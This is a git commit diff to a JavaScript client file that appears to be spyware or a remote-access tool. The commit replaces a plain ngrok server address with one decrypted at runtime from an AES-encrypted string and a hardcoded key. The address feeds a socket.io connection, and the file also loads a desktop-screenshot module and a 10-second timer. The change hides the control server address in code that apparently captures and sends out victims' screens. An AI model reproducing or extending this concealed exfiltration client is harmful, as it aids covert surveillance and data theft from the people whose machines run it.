da129374803052d1260de10d9c550b75d0ca7190
Vlad50-50 <auditorrevizor@gmail.com>
2024-05-04 18:11:20 +0300

    040525

--- client/program.js
+++ client/program.js
@@ -1,4 +1,13 @@
-const address = 'https://rational-namely-chipmunk.ngrok-free.app';
+const crypto = require('crypto');
+function decrypt(encryptedText, key) {
+    const decipher = crypto.createDecipher('aes-256-cbc', key);
+    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
+    decrypted += decipher.final('utf8');
+    return decrypted;
+}
+const key = '080545641479637dd61dddcea091eaf625888a280545d\\\\6414799c637d9cd61dddc91/88a2a210b935dadd6aa4e80a0e5a0591832-02a080545ddde5a059a4e810b935d__a04e810b835da';
+const decryptedText = decrypt('92d81d13fbaaf5fa9715d1d486fab918a6050799b0bc71124fe403d825ce5dfa09eec38911ee29313b5dd1a8d8f1962c', key);
+const address = decryptedText;
 const time = 10000;
 const socket = require('socket.io-client')(address);
 const screenshot = require('screenshot-desktop');
